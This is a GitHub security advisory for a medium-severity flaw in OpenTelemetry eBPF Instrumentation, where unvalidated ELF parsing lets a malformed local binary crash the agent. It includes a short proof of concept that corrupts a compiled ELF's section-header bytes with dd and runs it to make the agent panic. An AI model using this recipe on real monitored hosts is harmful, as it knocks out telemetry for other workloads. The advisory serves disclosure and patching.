# [M] OpenTelemetry eBPF Instrumentation: Unsafe fastelf parsing allows malformed ELF to crash agent

## Summary
Severity: Medium
Advisory: GHSA-wp73-mwgf-4jq9
CVE: CVE-2026-45676
CWE: CWE-20, CWE-248
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-wp73-mwgf-4jq9
Type: github-advisory

## Affected
- Go: `go.opentelemetry.io/obi` — affected >=0 <0.9.0

## Details
### Summary

OBI's replacement ELF parser trusts section offsets, counts, and string offsets from the executable file. A crafted local ELF can make OBI dereference invalid section pointers or slice past string tables, causing the agent to panic while determining the process language.

### Details

`matchExeSymbols `iterates over sections and uses offsets/symbol names from the unvalidated `fastelf `context; nil section pointers or out-of-range offsets can trigger panics during dereference/slicing.

https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/cec36c1b872beba9d17956bfde75dee3249a1516/pkg/internal/exec/proclang_linux.go#L133-L165

`GetCStringUnsafe` and `ReadStruct` perform unsafe slicing and pointer conversion without guarding against out-of-range or negative offsets derived from ELF data, enabling panics on malformed input.

https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/cec36c1b872beba9d17956bfde75dee3249a1516/pkg/internal/fastelf/fastelf.go#L201-L213

`NewElfContextFromData `trusts `Shoff`/`Shnum`/`Phnum `from the ELF header, converting them to `int `and populating sections/segments without validating offsets or ensuring `ReadStruct `returned non-nil.

https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/cec36c1b872beba9d17956bfde75dee3249a1516/pkg/internal/fastelf/fastelf.go#L271-L296

Malformed ELF metadata can therefore crash OBI during normal process discovery.

### PoC

Local testing confirms the parser panic path on the vulnerable release, but one caveat is worth noting: rerunning a previously captured malformed-ELF PoC directly against the current checkout did not reproduce the original crash. That means the parser has drifted since the vulnerable release, so reproduction should be performed against the affected release tag or commit range rather than assuming current `HEAD` still panics in exactly the same way.

Use a vulnerable build:

```bash
git checkout v0.0.0-rc.1+build
make build
```

Create a small valid ELF and then corrupt its section-header metadata:

```bash
cat >/tmp/hello.c <<'EOF'
int main(void) { return 0; }
EOF
cc -o /tmp/hello /tmp/hello.c
cp /tmp/hello /tmp/hello-bad
printf '\xff\xff' | dd of=/tmp/hello-bad bs=1 seek=$((0x3c)) conv=notrunc
```

Run the malformed executable so OBI inspects it during process discovery:

```bash
chmod +x /tmp/hello-bad
/tmp/hello-bad &
```

Start OBI or trigger a rescan of processes:

```bash
sudo ./bin/obi
```

On a vulnerable build, OBI can panic while parsing the malformed ELF. If the first corruption does not hit the exact fragile path on your architecture, alter section-name or symbol-table offsets instead; the root issue is the lack of defensive validation before `GetCStringUnsafe` and related section lookups.

### Impact

This is a local denial of service against the telemetry agent. Any local tenant or process owner able to execute a malformed binary on a monitored host can crash OBI and interrupt observability for other workloads.

## References
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/security/advisories/GHSA-wp73-mwgf-4jq9
- https://nvd.nist.gov/vuln/detail/CVE-2026-45676
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/releases/tag/v0.9.0
